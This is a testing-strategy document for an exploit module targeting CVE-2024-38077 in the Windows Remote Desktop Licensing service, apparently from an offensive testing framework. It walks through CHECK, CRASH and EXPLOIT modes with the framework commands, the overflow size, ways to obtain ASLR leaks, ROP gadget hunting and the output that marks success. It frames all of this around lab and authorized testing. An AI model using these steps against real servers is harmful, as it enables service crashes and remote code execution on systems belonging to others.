# Real-Target Testing Strategy — CVE-2024-38077

## Overview

This document defines the escalation path for testing CVE-2024-38077 against a real
Windows Server target. The strategy is: mock server → isolated lab → (optional) authorized
target. Each phase confirms the previous before advancing.

## Phase 1: Mock Server (DONE — 5/5 tests pass)

- `tests/mock_rpc_server.py` simulates TSLSP over ncacn_ip_tcp on port 24444
- `tests/test_cve_2024_38077.py` — 5 integration tests covering transport bind,
  CRASH protocol flow, overflow calculation, payload building, and mock analysis
- `core/engine.py` successfully loads and runs the module in CHECK and CRASH modes

**Confirm before Phase 2:**
  - [x] `python3 -m tests.test_cve_2024_38077` → all 5 pass
  - [x] Engine CHECK mode: `python3 armagedon.py` → success + vulnerable=True
  - [x] Engine CRASH mode: overflow calculated correctly (0x2fc1 → 3 bytes)
  - [x] Module list: `python3 -c "from core.engine import ArmagedonEngine; print(len(ArmagedonEngine().modules))"`

## Phase 2: Lab Target (Windows Server VM)

### Lab Requirements

| Item | Detail |
|------|--------|
| Target OS | Windows Server 2019 or 2022 (evaluation ISO) |
| Network | Host-only or isolated LAN |
| SMB port 445 | Open and reachable |
| Remote Desktop Licensing | Service installed and running (TermService) |
| Snapshot | Take BEFORE first test. Revert between CRASH runs |
| Attacker | Kali Linux on same network segment |

### Test Escalation

Always escalate in order. Stop and document at each level before proceeding.

#### Level 1: CHECK Mode (no crash risk)

```
python3 armagedon.py
use exploits/cve_2024_38077_madlicense_eop
set RHOSTS <target-ip>
set MODE CHECK
set VERBOSE True
run
```

Expected: "Target is running Remote Desktop Licensing service" + no crash.

#### Level 2: CRASH Mode (will crash TermService)

```
set MODE CRASH
set OVERFLOW_SIZE 0x2fc1
run
```

After run:
- TermService on target should crash (Services console or `sc query TermService`)
- Event Viewer → Windows Logs → System: event ID 7034 or 7031
- Revert VM snapshot after CRASH confirmation

#### Level 3: EXPLOIT Mode (requires ASLR bypass)

Only after Level 2 confirms a detectable crash:

1. **Leak acquisition** — obtain base addresses from the target:
   - Heap base (`HEAP_ADDRESS`)
   - ntdll.dll base (`NTDLL_ADDRESS`)
   - kernel32.dll base (`KERNEL32_ADDRESS`)
   
   Sources:
   - Local Windows VM of same build (check with `wmic os get BuildNumber`)
   - Leak via secondary info disclosure vuln (opnum 3? TLSRpcGetLKPInfo)
   - Leak from a compromised low-priv session on the same host
   
2. **Gadget hunt** — for the exact build:
   ```
   # On Windows target, with Windbg or rp++
   rp++ -f C:\Windows\System32\ntdll.dll -r 5 > gadgets_ntdll.txt
   rp++ -f C:\Windows\System32\kernel32.dll -r 5 > gadgets_kernel32.txt
   ```

3. **Update options with leaks** and run:
   ```
   set MODE EXPLOIT
   set LEAK_HEAP 0x<heap-addr>
   set LEAK_NTDLL 0x<ntdll-addr>
   set LEAK_KERNEL32 0x<kernel32-addr>
   set TARGET_VER 2019
   set PAYLOAD cmd.exe /c "whoami > C:\windows\temp\pwned.txt"
   run
   ```

### Safety Rules

1. **NEVER** run against a production target without explicit written authorization
2. **ALWAYS** take a VM snapshot before CRASH/EXPLOIT runs
3. **ALWAYS** revert between CRASH runs (TermService won't restart on its own if the process crashes)
4. **CHECK** is the only safe mode against a non-snapshotted target
5. **MINIMUM** test: 3 requests per mode — enough to confirm, not enough to amplify
6. **DOCUMENT** every response, event log, and crash behavior

### What Success Looks Like

#### CHECK Success
```
[+] Connected via RPC
[+] Context handle: <20-byte hex>
[+] Target is running Remote Desktop Licensing service
[+] Overflow calculation (input=0x2fc1):
[+]   Allocation: 0x23d0, Write: 0x23d3, Overflow: 3 bytes
```

#### CRASH Success
```
[crash payload sent]
[!] Connection dropped (service crashed)
[!] TermService is no longer responding on named pipe
```
Check Event Viewer for 7031/7034.

#### EXPLOIT Success
```
[+] Connection established
[+] Context handle obtained
[+] Overflow sent (%d bytes)
[+] ROP chain executed
[+] Payload created file at C:\windows\temp\pwned.txt
```

## Phase 3: Bug Bounty / Authorized Target

Only proceed when:
1. Target explicitly allows RCE testing in writing
2. Host is covered by a valid bug bounty or pentest contract
3. Impact is documented and reported through official channels
4. All safety rules from Phase 2 still apply

### Reporting

Per PoC template at `docs/PoC_Reports/CVE-2024-38077_MadLicense.md`:
- Confirm the CIA impact
- Document exact build, response time, crash behavior
- Include Event Viewer screenshots
- Submit with the minimal 3-request PoC

## Mock Server Limitations vs Real Target

| Aspect | Mock Server | Real Target |
|--------|-------------|-------------|
| Transport | ncacn_ip_tcp only | ncacn_np via SMB |
| Auth | None | Optional RPC auth |
| Context handle | Hardcoded 20 bytes | Real handle from service |
| Opnum 1 response | Fake handle | Real handle |
| Opnum 49 response | Returns success always | Returns success or error |
| Crash behavior | Logs overflow, doesn't crash | TermService process crash |
| ASLR | N/A | Real KASLR, need leak |
| ROP gadgets | N/A | Build-specific addresses needed |

## Verification Checklist (run after real test)

- [ ] CHECK mode confirms service is running and responds
- [ ] CRASH mode triggers 7034 event and TermService stops
- [ ] TermService restarts after manual start or VM revert
- [ ] `sc query TermService` shows STOPPED after crash
- [ ] Exact input size that triggers overflow documented
- [ ] Screenshots of Event Viewer and crash behavior saved
- [ ] All findings saved to `docs/PoC_Reports/` and `{severity}/` directory
